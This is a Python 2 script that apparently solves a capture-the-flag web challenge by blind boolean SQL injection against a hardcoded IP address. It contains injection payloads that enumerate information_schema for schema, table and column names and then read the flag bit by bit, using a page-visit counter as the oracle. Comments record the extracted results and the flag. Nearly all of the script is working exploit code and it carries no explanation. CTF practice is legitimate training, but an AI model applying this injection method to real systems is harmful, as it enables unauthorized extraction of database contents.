import urllib2
import urllib
from multiprocessing import Pool
import itertools
import sys

ue = lambda x:urllib.quote(x)
url = "http://178.62.34.76/notConfirmedInformation/"
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='gsaportal')),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(flag)from(flag)),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))

if __name__ == '__main__':
    result = bytearray()
    prev_visited = 419
    for i in range(1,80):
        tmp = 0
        for j in range(1,8):
            req = urllib2.Request(url+ query(i,j))
            res = urllib2.urlopen(req)
            visited = int(res.read().split('Visited:</b> ')[1].split('</div>')[0])
            if visited == prev_visited+1:
                prev_visited = visited
                tmp = tmp + (1<<(j-1))
        if tmp==0:
            break
        result.append(chr(tmp))
        sys.stdout.write(chr(tmp))
        sys.stdout.flush()


# information_schema,gsaportalinformation_schema,gsaportal
# flag : flag
# ASIS{SQLi_sT1lL_Ex1sT5_G0od_j0B}
